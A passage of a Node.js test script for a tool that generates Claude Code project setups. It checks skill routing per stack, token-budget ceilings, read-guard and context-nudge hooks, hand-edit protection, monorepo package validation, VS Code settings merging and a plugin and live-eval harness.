  const bad = spawnSync(process.execPath, [path.join(HERE, 'evals', 'scenarios.mjs'), '--dry-run', '--arms', 'bogus'], { encoding: 'utf8' });
  check(bad.status === 2 && /unknown arm/.test(bad.stderr), 'an unknown arm name is rejected');
}
}

if (on('context tool')) {
console.log('\n[context tool]');
{
  const r = spawnSync(process.execPath, [path.join(HERE, 'evals', 'context.mjs')], { encoding: 'utf8' });
  check(r.status === 0 && /always-routed description tokens: \d+/.test(r.stdout), 'evals/context.mjs reports always-routed description tokens');
}
}

if (on('stack matrix')) {
console.log('\n[stack matrix]');
{
  const map = JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8'));
  const langSkills = new Set(Object.values(map.stack).flat());
  const baseline = new Set([...map.always, ...map.types.other]);
  const mdir = path.join(base, 'matrix');
  const denyExpect = { laravel: ['vendor/'], react: ['node_modules/'], django: ['.venv/'], go: [] };
  const denyAbsent = { go: ['vendor/', 'node_modules/', '.venv/'] };
  let n = 0;
  for (const [token, want] of Object.entries(map.stack)) {
    const d = path.join(mdir, token); fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, 'project.config.yml'), `name: M-${token}\ntype: other\nstack: [${token}]\nrun_in_docker: false\nskills_mode: focused\nbranches: {working: a, integration: "", production: main}\n`);
    const r = run(d);
    const have = new Set(fs.existsSync(path.join(d, '.claude/skills')) ? fs.readdirSync(path.join(d, '.claude/skills')) : []);
    const missing = want.filter((s) => !have.has(s));
    const stray = [...have].filter((s) => langSkills.has(s) && !want.includes(s) && !baseline.has(s));
    check(r.status === 0 && missing.length === 0 && stray.length === 0, `stack "${token}" installs ${want.join(', ')} and no other stack's skills${missing.length ? ' (missing: ' + missing.join(', ') + ')' : ''}${stray.length ? ' (stray: ' + stray.join(', ') + ')' : ''}${r.status ? '\n' + r.stderr : ''}`);
    const claudeMd = fs.readFileSync(path.join(d, '.claude/CLAUDE.md'), 'utf8');
    if (!want.every((s) => claudeMd.includes('`' + s + '`'))) check(false, `stack "${token}" skill routing lists ${want.join(', ')}`);
    n++;
  }
  console.log(`  (${n} stack tokens checked)`);
  for (const [token, subs] of Object.entries(denyExpect)) {
    const s = JSON.parse(fs.readFileSync(path.join(mdir, token, '.claude/settings.json'), 'utf8')).permissions.deny.join('\n');
    check(subs.every((x) => s.includes(x)), `stack "${token}" deny rules include ${subs.join(', ') || '(none)'}`);
    for (const x of denyAbsent[token] || []) check(!s.includes(x), `stack "${token}" does not deny ${x}`);
  }
  const unk = path.join(mdir, 'unknown'); fs.mkdirSync(unk, { recursive: true });
  fs.writeFileSync(path.join(unk, 'project.config.yml'), 'name: U\ntype: other\nstack: [cobol]\nskills_mode: all\nbranches: {working: a, production: main}\n');
  const ur = run(unk);
  check(ur.status === 0 && /matched no skill: cobol/.test(ur.stderr), 'unknown stack token warns but still generates');
  const sw = path.join(mdir, 'seo-as-stack'); fs.mkdirSync(sw, { recursive: true });
  fs.writeFileSync(path.join(sw, 'project.config.yml'), 'name: S\ntype: other\nstack: [seo]\nbranches: {working: a, production: main}\n');
  check(/seo is a domain: put it under `domains`/.test(run(sw).stderr), 'a domain name used as a stack token gets a hint to use `domains`');
  check(/Skills: \d+ installed, \d+ model-invocable \(~\d+ tokens/.test(ur.stdout) && /skills_mode: focused would install/.test(ur.stdout), 'init reports skill token overhead and the focused saving');
  // Default is focused: an unset skills_mode installs fewer skills than skills_mode: all, and routing says so.
  const def = path.join(mdir, 'default-focused'); fs.mkdirSync(def, { recursive: true });
  fs.writeFileSync(path.join(def, 'project.config.yml'), 'name: D\ntype: api\nstack: [node]\nbranches: {working: a, production: main}\n');
  check(run(def).status === 0, 'default config (no skills_mode) generates');
  const nSkills = (d) => fs.readdirSync(path.join(d, '.claude', 'skills')).length;
  check(nSkills(def) < nSkills(unk), 'skills_mode defaults to focused (fewer skills than all)');
}

}

if (on('cost optimizer')) {
console.log('\n[cost optimizer]');
{
  const mk = (name, extra = '') => {
    const d = path.join(base, name); fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, 'project.config.yml'), `name: C\ntype: fullstack\nstack: [laravel, blade, mysql, tailwind]\npackage_manager: composer\nrun_in_docker: false\ntest_command: "php artisan test"\nbranches: {working: a, integration: develop, production: main}\n${extra}`);
    return d;
  };
  const fmOf = (f) => (fs.readFileSync(f, 'utf8').match(/^---\r?\n([\s\S]*?)\r?\n---/) || [, ''])[1];

  // manual-only skills are hidden from the model; doc-sync stays invocable because other skills chain into it
  const d = mk('cost-default');
  const r = run(d);
  const manual = ['commit', 'commit-push', 'push', 'merge-to-dev', 'merge-to-main', 'ship', 'pr', 'status', 'sync', 'review', 'deploy', 'build', 'project-init'];
  check(manual.every((s) => /^disable-model-invocation:\s*true/m.test(fmOf(path.join(d, '.claude/skills', s, 'SKILL.md')))), 'git/manual skills are disable-model-invocation: true');
  check(!/^disable-model-invocation/m.test(fmOf(path.join(d, '.claude/skills/doc-sync/SKILL.md'))), 'doc-sync stays model-invocable (other skills chain into it)');
  const m = r.stdout.match(/Always-loaded context: ~(\d+) tokens \(instructions ~(\d+), rules ~(\d+), skill descriptions ~(\d+), agent descriptions ~(\d+)\)/);
  check(Boolean(m), 'init prints the always-loaded context breakdown');
  const total = m ? Number(m[1]) : 1e9;
  check(total < 5500, `always-loaded context stays under the regression ceiling: ~${total} < 5500 tokens (fullstack laravel, skills_mode all)`);
  const bud = run(mk('cost-budget', 'token_budget: 100\n'));
  check(/over token_budget \(100\)/.test(bud.stderr) && bud.status === 0, 'token_budget warns (exit 0) when always-loaded context is over budget');
  check(run(mk('cost-badnum', 'big_file_kb: lots\n')).status === 1, 'non-numeric big_file_kb is rejected');

  // hooks registered
  const st = JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8'));
  check((st.hooks.PreToolUse || []).some((g) => g.matcher === 'Read' && /guard-read\.mjs/.test(g.hooks[0].command)), 'settings.json registers guard-read on Read');
  check((st.hooks.UserPromptSubmit || []).some((g) => g.matcher === undefined && /context-nudge\.mjs/.test(g.hooks[0].command)), 'settings.json registers context-nudge on UserPromptSubmit');
  check(/0 created, 0 updated/.test(run(d).stdout), 'cost hooks: second run changes nothing (idempotent)');
  const off = mk('cost-off', 'big_file_kb: 0\ncontext_nudge_kb: 0\n'); run(off);
  const so = JSON.parse(fs.readFileSync(path.join(off, '.claude/settings.json'), 'utf8'));
  check(!/guard-read|context-nudge/.test(JSON.stringify(so.hooks)) && !fs.existsSync(path.join(off, '.claude/hooks/guard-read.mjs')), 'big_file_kb: 0 and context_nudge_kb: 0 install neither hook');

  // guard-read
  const hook = (dir, name, input, env = {}) => spawnSync(process.execPath, [path.join(dir, '.claude/hooks', `${name}.mjs`)], { input: JSON.stringify({ cwd: dir, ...input }), encoding: 'utf8', env: { ...process.env, ...env } });
  const big = path.join(d, 'big.txt'); fs.writeFileSync(big, 'x'.repeat(150 * 1024));
  const small = path.join(d, 'small.txt'); fs.writeFileSync(small, 'hello');
  const lock = path.join(d, 'composer.lock'); fs.writeFileSync(lock, 'y'.repeat(8000));
  const rd = (file_path, extra = {}) => hook(d, 'guard-read', { tool_name: 'Read', tool_input: { file_path, ...extra } });
  check(rd(big).status === 2 && /Grep/.test(rd(big).stderr), 'guard-read: blocks a whole-file read of a 150 KB file and points to Grep');
  check(rd(big, { limit: 100 }).status === 0 && rd(big, { offset: 10 }).status === 0, 'guard-read: allows the same file with offset/limit');
  check(rd(small).status === 0 && rd(path.join(d, 'missing.txt')).status === 0, 'guard-read: allows small and missing files');
  check(rd(lock).status === 2 && rd(lock, { limit: 50 }).status === 0, 'guard-read: blocks a large lockfile unless offset/limit is given');

  // context-nudge
  const tr = path.join(d, 'transcript.jsonl'); fs.writeFileSync(tr, 'z'.repeat(500 * 1024));
  const sid = 'test-' + Date.now();
  const n1 = hook(d, 'context-nudge', { session_id: sid, transcript_path: tr });
  let msg = ''; try { msg = JSON.parse(n1.stdout).systemMessage; } catch { /* no output */ }
  check(n1.status === 0 && /\/compact/.test(msg), 'context-nudge: warns the user when the transcript is large');
  check(hook(d, 'context-nudge', { session_id: sid, transcript_path: tr }).stdout === '', 'context-nudge: does not repeat until the transcript grows 25%');
  const tiny = path.join(d, 'tiny.jsonl'); fs.writeFileSync(tiny, 'a');
  check(hook(d, 'context-nudge', { session_id: sid + 'b', transcript_path: tiny }).stdout === '', 'context-nudge: silent for a small transcript');

  // model profiles
  const model = (dir, agent) => (fmOf(path.join(dir, '.claude/agents', `${agent}.md`)).match(/^model:\s*(\S+)/m) || [])[1];
  check(model(d, 'git-manager') === 'haiku' && model(d, 'architect') === undefined && st.model === 'sonnet', 'model_profile default (balanced) keeps the agent files as written');
  const eco = mk('cost-eco', 'model_profile: economy\n'); run(eco);
  check(model(eco, 'architect') === 'sonnet' && model(eco, 'git-manager') === 'haiku' && model(eco, 'backend-engineer') === 'sonnet', 'model_profile economy: sonnet everywhere except haiku for git-manager');
  const qual = mk('cost-quality', 'model_profile: quality\n'); run(qual);
  check(model(qual, 'architect') === 'opus' && model(qual, 'planner') === 'opus' && model(qual, 'backend-engineer') === undefined && JSON.parse(fs.readFileSync(path.join(qual, '.claude/settings.json'), 'utf8')).model === 'opus', 'model_profile quality: opus for architect/planner/debugger/security-reviewer and the main model');
  check(/0 created, 0 updated/.test(run(eco).stdout), 'model_profile: second run changes nothing (idempotent)');
  check(run(mk('cost-badprofile', 'model_profile: turbo\n')).status === 1, 'unknown model_profile is rejected');
}

}

if (on('safe upgrades')) {
console.log('\n[safe upgrades]');
{
  const schema = JSON.parse(fs.readFileSync(path.join(HERE, 'project.config.schema.json'), 'utf8'));
  const props = Object.keys(schema.properties);
  const example = fs.readFileSync(path.join(HERE, 'project.config.example.yml'), 'utf8');
  const exampleKeys = [...example.matchAll(/^([a-z_]+):/gm)].map((m) => m[1]);
  const notInSchema = exampleKeys.filter((k) => !props.includes(k));
  const notInExample = props.filter((k) => !exampleKeys.includes(k) && !new RegExp(`^# ${k}:`, 'm').test(example)); // a commented example block counts
  check(notInSchema.length === 0 && notInExample.length === 0, `schema and project.config.example.yml list the same keys${notInSchema.length ? ' (not in schema: ' + notInSchema + ')' : ''}${notInExample.length ? ' (not in example: ' + notInExample + ')' : ''}`);
  const types = Object.keys(JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8')).types);
  check(JSON.stringify(schema.properties.type.enum) === JSON.stringify(types), 'schema "type" enum matches skill-map.json types');
  check(/yaml-language-server: \$schema=/.test(example.split('\n')[0]), 'example config points editors at the schema');

  const mk = (name, extra = '') => {
    const d = path.join(base, name); fs.mkdirSync(d, { recursive: true });
    fs.writeFileSync(path.join(d, 'project.config.yml'), `name: S\ntype: web\nstack: [laravel]\nrun_in_docker: false\nbranches: {working: a, integration: "", production: main}\n${extra}`);
    return d;
  };
  const cfgPath = (d) => path.join(d, 'project.config.yml');
  const rd = (d, f) => fs.readFileSync(path.join(d, f), 'utf8');

  // unknown keys
  const typo = run(mk('safe-typo', 'skils_mode: focused\n'));
  check(typo.status === 0 && /unknown config key "skils_mode" is ignored \(did you mean "skills_mode"\?\)/.test(typo.stderr), 'a mistyped config key warns with a suggestion (and still generates)');

  // --check
  const c = mk('safe-check');
  const pre = run(c, ['--check']);
  check(pre.status === 1 && /out of date/.test(pre.stderr) && !fs.existsSync(path.join(c, '.claude')), '--check fails on an un-initialized project and writes nothing');
  check(run(c).status === 0, 'init succeeds');
  const post = run(c, ['--check']);
  check(post.status === 0 && /in sync/.test(post.stdout), '--check passes right after init');
  fs.appendFileSync(cfgPath(c), 'notes:\n  - "new rule"\n');
  check(run(c, ['--check']).status === 1, '--check fails after the config changes');
  check(run(c).status === 0 && run(c, ['--check']).status === 0, '--check passes again after re-running init');

  // hand-edit protection
  const e = mk('safe-edit');
  run(e);
  check(fs.existsSync(path.join(e, '.claude/.template-hashes.json')), 'init records generated-file hashes');
  const hashes = JSON.parse(rd(e, '.claude/.template-hashes.json'));
  check(hashes['AGENTS.md'] && !hashes['.claude/settings.json'], 'hash file tracks generated docs but not the merged settings.json');
  fs.appendFileSync(path.join(e, 'AGENTS.md'), '\nMY HAND EDIT\n');
  fs.appendFileSync(cfgPath(e), 'notes:\n  - "brand new note"\n');
  const kr = run(e);
  check(kr.status === 0 && /Kept 1 file\(s\) you edited by hand/.test(kr.stdout) && /AGENTS\.md/.test(kr.stdout), 'a hand-edited generated file is kept and reported');
  check(/MY HAND EDIT/.test(rd(e, 'AGENTS.md')) && !/brand new note/.test(rd(e, 'AGENTS.md')), 'kept file still has the hand edit and none of the new config');
  check(/brand new note/.test(rd(e, '.claude/CLAUDE.md')), 'untouched generated files still update');
  const tmpl = walk(path.join(e, '.claude/.init-backup')).filter((f) => f.endsWith('AGENTS.md.template'));
  check(tmpl.length === 1 && /brand new note/.test(fs.readFileSync(tmpl[0], 'utf8')), 'the new template version is saved as <file>.template for merging');
  check(run(e, ['--check']).status === 0, '--check does not fail because of an intentionally edited file');
  const fr = run(e, ['--force']);
  check(fr.status === 0 && /brand new note/.test(rd(e, 'AGENTS.md')) && !/MY HAND EDIT/.test(rd(e, 'AGENTS.md')), '--force overwrites the hand-edited file');
  check(walk(path.join(e, '.claude/.init-backup')).some((f) => f.endsWith('AGENTS.md') && /MY HAND EDIT/.test(fs.readFileSync(f, 'utf8'))), '--force keeps a backup of the hand edit');
  check(/0 created, 0 updated/.test(run(e).stdout), 'safe upgrades: re-run after --force changes nothing');

  // CRLF working-tree conversion (git autocrlf) is not an edit
  const crlf = path.join(e, 'AGENTS.md');
  fs.writeFileSync(crlf, rd(e, 'AGENTS.md').replace(/\n/g, '\r\n'));
  const cr = run(e);
  check(/0 created, 0 updated/.test(cr.stdout) && !/Kept/.test(cr.stdout) && /\r\n/.test(rd(e, 'AGENTS.md')), 'CRLF line endings are not treated as an edit and are left alone');

  // projects initialized before hash tracking: behave as before (overwrite with backup)
  const l = mk('safe-legacy');
  run(l);
  fs.unlinkSync(path.join(l, '.claude/.template-hashes.json'));
  fs.appendFileSync(path.join(l, 'AGENTS.md'), '\nLEGACY EDIT\n');
  const lr = run(l);
  check(lr.status === 0 && !/Kept/.test(lr.stdout) && !/LEGACY EDIT/.test(rd(l, 'AGENTS.md')) && fs.existsSync(path.join(l, '.claude/.template-hashes.json')), 'without a hash file (older projects) init overwrites with a backup, then starts tracking');
}

}

if (on('monorepo')) {
console.log('\n[monorepo]');
{
  const d = path.join(base, 'mono'); fs.mkdirSync(path.join(d, 'apps/web'), { recursive: true }); fs.mkdirSync(path.join(d, 'services/api'), { recursive: true });
  const cfg = (pk) => `name: Mono\ntype: fullstack\nstack: [typescript]\nskills_mode: focused\nrun_in_docker: false\nbranches: {working: a, integration: "", production: main}\npackages:\n${pk}`;
  const good = `  web:\n    path: apps/web\n    stack: [react, nextjs]\n    test_command: "pnpm --filter web test"\n    notes:\n      - "Use the design tokens"\n  api:\n    path: services/api/\n    type: api\n    stack: [python, fastapi]\n  ghost:\n    path: nope\n    stack: [go]\n`;
  fs.writeFileSync(path.join(d, 'project.config.yml'), cfg(good));
  const r = run(d);
  check(r.status === 0 && !/unknown config key/.test(r.stderr), `monorepo config generates without unknown-key warnings${r.status ? '\n' + r.stderr : ''}`);
  const web = fs.existsSync(path.join(d, 'apps/web/CLAUDE.md')) ? fs.readFileSync(path.join(d, 'apps/web/CLAUDE.md'), 'utf8') : '';
  check(/Tests: `pnpm --filter web test`/.test(web) && /react-development/.test(web) && /nextjs-development/.test(web) && /Use the design tokens/.test(web), 'package CLAUDE.md has stack, tests, package skills and notes');
  check(!/frontend-engineering/.test(web), 'package CLAUDE.md lists stack-specific skills only (no type-wide noise)');
  const api = fs.existsSync(path.join(d, 'services/api/CLAUDE.md')) ? fs.readFileSync(path.join(d, 'services/api/CLAUDE.md'), 'utf8') : '';
  check(/python-development/.test(api) && /Type api/.test(api), 'package type override and trailing slash in path work');
  check(/folder "nope" does not exist; package ignored/.test(r.stderr) && !fs.existsSync(path.join(d, 'nope')), 'missing package folder is ignored with a warning (never created)');
  check(!fs.existsSync(path.join(d, '.claude/skills/go-development')), 'an ignored package does not route its skills');
  const sk = (n) => fs.existsSync(path.join(d, '.claude/skills', n, 'SKILL.md'));
  check(sk('react-development') && sk('nextjs-development') && sk('python-development') && sk('typescript-development'), 'skills are routed for the union of root and package stacks');
  const root = fs.readFileSync(path.join(d, '.claude/CLAUDE.md'), 'utf8');
  check(/- `apps\/web\/` \(react, nextjs\), tests: `pnpm --filter web test`/.test(root) && !/- - /.test(root), 'root .claude/CLAUDE.md lists the packages');
  check(/0 created, 0 updated/.test(run(d).stdout) && run(d, ['--check']).status === 0, 'monorepo: re-run is idempotent and --check passes');
  for (const [name, p] of Object.entries({ 'path traversal': '  x:\n    path: ../outside\n', 'absolute path': '  x:\n    path: /etc\n', 'inside .claude': '  x:\n    path: .claude/skills\n', 'missing path': '  x:\n    stack: [go]\n', 'bad type': '  x:\n    path: apps/web\n    type: banana\n' })) {
    const bd = path.join(base, 'mono-bad'); fs.mkdirSync(path.join(bd, 'apps/web'), { recursive: true });
    fs.writeFileSync(path.join(bd, 'project.config.yml'), cfg(p));
    check(run(bd).status === 1, `packages: ${name} is rejected`);
  }
}

}

if (on('opt-in hooks, mcp, path rules')) {
console.log('\n[opt-in hooks, mcp, path rules]');
{
  const d = path.join(base, 'optin'); fs.mkdirSync(d, { recursive: true });
  const body = (extra) => `name: O\ntype: web\nstack: [laravel]\nrun_in_docker: false\nbranches: {working: a, integration: "", production: main}\n${extra}`;
  const cfgp = path.join(d, 'project.config.yml');
  const settings = () => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8'));

  // defaults: nothing opt-in is installed
  fs.writeFileSync(cfgp, body(''));
  const r0 = run(d);
  check(r0.status === 0 && !settings().statusLine && !/session-context/.test(JSON.stringify(settings().hooks)) && !fs.existsSync(path.join(d, '.claude/hooks/statusline.mjs')), 'statusline and session_context are off by default');

  // on
  fs.writeFileSync(cfgp, body('statusline: true\nsession_context: true\nmcp_allow: [github, postgres]\nmcp_deny: [slack]\n'));
  const r1 = run(d);
  const st = settings();
  check(r1.status === 0 && st.statusLine && st.statusLine.type === 'command' && /statusline\.mjs/.test(st.statusLine.command) && fs.existsSync(path.join(d, '.claude/hooks/statusline.mjs')), 'statusline: true registers statusLine and copies the script');
  check((st.hooks.SessionStart || []).some((g) => g.matcher === 'startup|clear' && /session-context\.mjs/.test(g.hooks[0].command)), 'session_context: true registers the SessionStart hook');
  check(JSON.stringify(st.enabledMcpjsonServers) === JSON.stringify(['github', 'postgres']) && st.enableAllProjectMcpServers === false && st.permissions.deny.includes('mcp__slack'), 'mcp_allow / mcp_deny write enabledMcpjsonServers and a deny rule');
  check(/0 created, 0 updated/.test(run(d).stdout), 'opt-in settings: second run changes nothing (idempotent)');
  check(run(Object.assign(d, {}), ['--check']).status === 0, 'opt-in settings: --check passes');

  // a status line the user set themselves is never replaced
  const s2 = settings(); s2.statusLine = { type: 'command', command: 'my-own-line' }; fs.writeFileSync(path.join(d, '.claude/settings.json'), JSON.stringify(s2, null, 2));
  const r2 = run(d);
  check(settings().statusLine.command === 'my-own-line' && /different statusLine; left unchanged/.test(r2.stderr), 'an existing custom statusLine is left alone with a warning');
  const s3 = settings(); delete s3.statusLine; fs.writeFileSync(path.join(d, '.claude/settings.json'), JSON.stringify(s3, null, 2));
  run(d);
  fs.writeFileSync(cfgp, body('statusline: false\n'));
  run(d);
  check(!settings().statusLine, 'statusline: false removes our status line');

  // bad MCP name
  fs.writeFileSync(cfgp, body('mcp_deny: ["bad name!"]\n'));
  check(run(d).status === 1, 'an invalid MCP server name is rejected');

  // statusline script
  const sl = (input) => spawnSync(process.execPath, [path.join(d, '.claude/hooks/statusline.mjs')], { input: typeof input === 'string' ? input : JSON.stringify(input), encoding: 'utf8' });
  fs.writeFileSync(cfgp, body('statusline: true\nsession_context: true\n')); run(d);
  const so = sl({ model: { display_name: 'Sonnet' }, cwd: d, context_window: { used_percentage: 42.4 }, cost: { total_cost_usd: 0.3456 } });
  check(so.status === 0 && /\[Sonnet\]/.test(so.stdout) && /ctx .*42%/.test(so.stdout) && /\$0\.35/.test(so.stdout), 'statusline script prints model, context % and cost');
  check(sl('not json').status === 0 && sl({}).status === 0 && /\[Claude\]/.test(sl({}).stdout), 'statusline script never fails on bad or empty input');

  // session-context script
  spawnSync('git', ['init', '-q'], { cwd: d }); spawnSync('git', ['symbolic-ref', 'HEAD', 'refs/heads/dev1'], { cwd: d });
  const sc = spawnSync(process.execPath, [path.join(d, '.claude/hooks/session-context.mjs')], { input: JSON.stringify({ cwd: d }), encoding: 'utf8' });
  let ctxText = ''; try { ctxText = JSON.parse(sc.stdout).hookSpecificOutput.additionalContext; } catch { /* no output */ }
  check(sc.status === 0 && /dev1/.test(ctxText), 'session-context injects the branch and status as additionalContext');
  const nogit = path.join(base, 'optin-nogit'); fs.mkdirSync(nogit, { recursive: true });
  const sn = spawnSync(process.execPath, [path.join(d, '.claude/hooks/session-context.mjs')], { input: JSON.stringify({ cwd: nogit }), encoding: 'utf8' });
  check(sn.status === 0 && sn.stdout === '', 'session-context is silent outside a git repository');

  // path-scoped rule: installed, but not counted as always-loaded
  const tr = fs.readFileSync(path.join(d, '.claude/rules/TESTING.md'), 'utf8');
  check(/^paths:/m.test(tr) && !/always_on/.test(tr), 'TESTING.md is path-scoped (loads only when test files are touched)');
  const all = run(d);
  const rulesTok = Number((all.stdout.match(/rules ~(\d+)/) || [])[1]);
  const rulesBytes = fs.readdirSync(path.join(d, '.claude/rules')).reduce((n, f) => n + fs.statSync(path.join(d, '.claude/rules', f)).size, 0);
  check(rulesTok > 0 && rulesTok < Math.round(rulesBytes / 4), `path-scoped rules are excluded from the always-loaded estimate (${rulesTok} < ${Math.round(rulesBytes / 4)} tokens)`);
}

}

if (on('plugin + live eval')) {
console.log('\n[plugin + live eval]');
{
  const b = spawnSync(process.execPath, [path.join(HERE, 'build-plugin.mjs'), '--check'], { encoding: 'utf8' });
  check(b.status === 0, `plugin files (skills/, .claude-plugin/) are in sync with global-skills and VERSION${b.status ? '\n' + b.stderr : ''}`);
  const pj = JSON.parse(fs.readFileSync(path.join(HERE, '.claude-plugin/plugin.json'), 'utf8'));
  const mj = JSON.parse(fs.readFileSync(path.join(HERE, '.claude-plugin/marketplace.json'), 'utf8'));
  check(pj.name === 'agents-template' && pj.version === fs.readFileSync(path.join(HERE, 'VERSION'), 'utf8').trim(), 'plugin.json has a name and the current VERSION');
  check(mj.name && mj.owner && mj.owner.name && mj.plugins.length === 1 && mj.plugins[0].name === pj.name && mj.plugins[0].source === './', 'marketplace.json lists the plugin with the repo root as its source');
  const skillText = fs.readFileSync(path.join(HERE, 'skills/agent-init/SKILL.md'), 'utf8');
  check(/\$\{CLAUDE_PLUGIN_ROOT\}\/init\.mjs/.test(skillText) && !/__TEMPLATE_DIR__/.test(skillText), 'plugin skills call init.mjs through ${CLAUDE_PLUGIN_ROOT}');

  const live = await import(pathToFileURL(path.join(HERE, 'evals/live.mjs')).href);
  const skills = live.loadInvocableSkills();
  check(skills.some((s) => s.name === 'bug-investigation') && !skills.some((s) => s.name === 'commit'), 'live eval lists model-invocable skills only');
  const sys = live.buildSystem(skills);
  check(/bug-investigation:/.test(sys) && /ONLY JSON/.test(sys), 'live eval builds the skill-list system prompt');
  const known = new Set(['a', 'b']);
  check(JSON.stringify(live.parseAnswer('```json\n{"skills": ["a", "zzz"]}\n```', known)) === '["a"]' && live.parseAnswer('no json', known).length === 0 && live.parseAnswer('{"skills": "a"}', known).length === 0, 'live eval parses fenced JSON and ignores unknown names or garbage');
  const dry = spawnSync(process.execPath, [path.join(HERE, 'evals/live.mjs'), '--dry-run', '--limit', '1'], { encoding: 'utf8', env: { ...process.env, ANTHROPIC_API_KEY: '' } });
  check(dry.status === 0 && /system \(/.test(dry.stdout), 'live eval --dry-run makes no API call');
  const nokey = spawnSync(process.execPath, [path.join(HERE, 'evals/live.mjs'), '--limit', '1'], { encoding: 'utf8', env: { ...process.env, ANTHROPIC_API_KEY: '' } });
  check(nokey.status === 2 && /ANTHROPIC_API_KEY/.test(nokey.stderr), 'live eval refuses to run without an API key');
}

}

if (on('forbid')) {
console.log('\n[forbid]');
const bad = path.join(base, 'forbid');
fs.mkdirSync(bad, { recursive: true });
fs.writeFileSync(path.join(bad, 'project.config.yml'), 'name: Bad\ntype: web\nstack: [laravel]\nbranches: {working: a, integration: develop, production: main}\nnotes:\n  - "copied from oldproject"\nforbid: [oldproject]\n');
check(run(bad).status === 1, 'forbidden term makes init fail');

// scaffold detects a non-JS/PHP stack and the draft config generates cleanly
}

if (on('scaffold-go')) {
console.log('\n[scaffold-go]');
const go = path.join(base, 'go-cli'); fs.mkdirSync(go);
fs.writeFileSync(path.join(go, 'go.mod'), 'module example.com/x\n');
const sc = spawnSync(process.execPath, [INIT, '--scaffold', '--target', go], { encoding: 'utf8' });
const draft = fs.existsSync(path.join(go, 'project.config.yml')) ? fs.readFileSync(path.join(go, 'project.config.yml'), 'utf8') : '';
check(sc.status === 0 && /stack: \[go\]/.test(draft) && /type: other/.test(draft) && /go test/.test(draft), 'scaffold detects go (type other, go test)');
check(/skills_mode: focused/.test(draft), 'scaffold drafts skills_mode: focused');
check(run(go).status === 0, 'init accepts the scaffolded go config');
check(fs.existsSync(path.join(go, '.claude/skills/go-development/SKILL.md')) && /`go-development`/.test(fs.readFileSync(path.join(go, '.claude/CLAUDE.md'), 'utf8')), 'go project routes to go-development');

}

if (on('vscode settings')) {
console.log('\n[vscode settings]');
{
  const git = (d, ...a) => spawnSync('git', a, { cwd: d, encoding: 'utf8' });
  const mk = (name, extraCfg = '', gi = '.vscode/\n') => {
    const d = path.join(base, name);
    fs.mkdirSync(d, { recursive: true });
    git(d, 'init', '-q');
    fs.writeFileSync(path.join(d, '.gitignore'), gi);
    fs.writeFileSync(path.join(d, 'project.config.yml'), `name: V\ntype: other\nstack: [go]\nbranches: {working: a, production: main}\n${extraCfg}`);
    return d;
  };
  const sp = (d) => path.join(d, '.vscode/settings.json');
  const rd = (d) => fs.readFileSync(sp(d), 'utf8');
  const a = mk('vs-new');
  const r1 = run(a);
  const j = JSON.parse(rd(a));
  check(r1.status === 0 && j['search.useIgnoreFiles'] === false && j['search.useParentIgnoreFiles'] === false && j['search.exclude']['**/.claude/.init-backup'] === true, 'creates .vscode/settings.json when .vscode/ is git-ignored');
  const before = rd(a);
  check(run(a).stdout.includes('0 created, 0 updated') && rd(a) === before, 'vscode settings are idempotent');

  const b = mk('vs-merge');
  fs.mkdirSync(path.join(b, '.vscode'));
  fs.writeFileSync(sp(b), '{\r\n  "editor.tabSize": 2,\r\n  "search.useIgnoreFiles": true,\r\n  "search.exclude": { "**/dist": true }\r\n}\r\n');
  run(b);
  const jb = JSON.parse(rd(b));
  check(jb['search.useIgnoreFiles'] === true && jb['search.useParentIgnoreFiles'] === false && jb['editor.tabSize'] === 2 && jb['search.exclude']['**/dist'] === true && jb['search.exclude']['**/.claude/.init-backup'] === true, 'merge adds missing keys and never overwrites user values');
  check(/\r\n/.test(rd(b)) && !/[^\r]\n/.test(rd(b)), 'merge preserves CRLF line endings');

  const c = mk('vs-jsonc');
  fs.mkdirSync(path.join(c, '.vscode'));
  fs.writeFileSync(sp(c), '{\n  // keep me\n  "editor.tabSize": 4, /* note */\n}\n');
  run(c);
  const tc = rd(c);
  check(tc.includes('// keep me') && tc.includes('/* note */') && JSON.parse(tc.replace(/\/\/.*|\/\*.*?\*\//g, '').replace(/,(\s*})/g, '$1'))['search.useIgnoreFiles'] === false, 'JSONC file keeps comments and gets the missing keys');

  const n = mk('vs-notignored', '', 'node_modules/\n');
  const rn = run(n);
  check(rn.status === 0 && !fs.existsSync(sp(n)) && /not git-ignored/.test(rn.stdout), 'does not write when .vscode/ is not git-ignored (warns instead)');

  const o = mk('vs-optout', 'vscode_settings: false\n');
  check(run(o).status === 0 && !fs.existsSync(sp(o)), 'vscode_settings: false skips the file');

  const bad = mk('vs-bad');
  fs.mkdirSync(path.join(bad, '.vscode'));
  fs.writeFileSync(sp(bad), '{ not json');
  const rb = run(bad);
  check(rb.status === 0 && rd(bad) === '{ not json' && /could not be parsed/.test(rb.stdout), 'unparseable settings file is left untouched with a warning');
}

}

if (on('bench')) {
  console.log('\n[bench]');
  const br = spawnSync(process.execPath, [path.join(HERE, 'bench.mjs'), '--json'], { encoding: 'utf8' });
  check(br.status === 0, 'bench.mjs runs');
  let rows = [];
  try { rows = JSON.parse(br.stdout); } catch { /* reported below */ }
  check(rows.length === 3 && rows.every((r) => r.saved > 0 && r.optimized > 0), 'generated always-loaded context is smaller than the unoptimized setup for every sample');
  // Budget gate: the template's promise is low always-loaded context. Ceilings are the measured values plus ~10% headroom;
  // raise one only on purpose (a bigger skill or description is a cost every session pays).
  const CEILING = { 'laravel (focused, default)': 3800, 'expo mobile (focused, default)': 3850, 'python api (skills_mode: all)': 6700 };
  for (const r of rows) check(r.optimized <= (CEILING[r.project] || Infinity), `always-loaded context stays within budget: ${r.project} ${r.optimized} <= ${CEILING[r.project]} tokens`);
}

if (on('routing lib')) {
console.log('\n[routing lib]');
{
  const { focusSkills, expandDeps, shipsWithSkill, claimViolations } = await import(pathToFileURL(path.join(HERE, 'lib', 'routing.mjs')).href);
  const map = { types: { mobile: ['ui'] }, stack: { flutter: ['flutter-dev'] }, deps: { 'flutter-dev': ['m-arch', 'm-sec'], 'm-arch': ['m-sec', 'flutter-dev'] }, domains: { seo: ['seo-tech'] } };
  const installed = new Set(['ui', 'flutter-dev', 'm-arch', 'm-sec', 'seo-tech']);
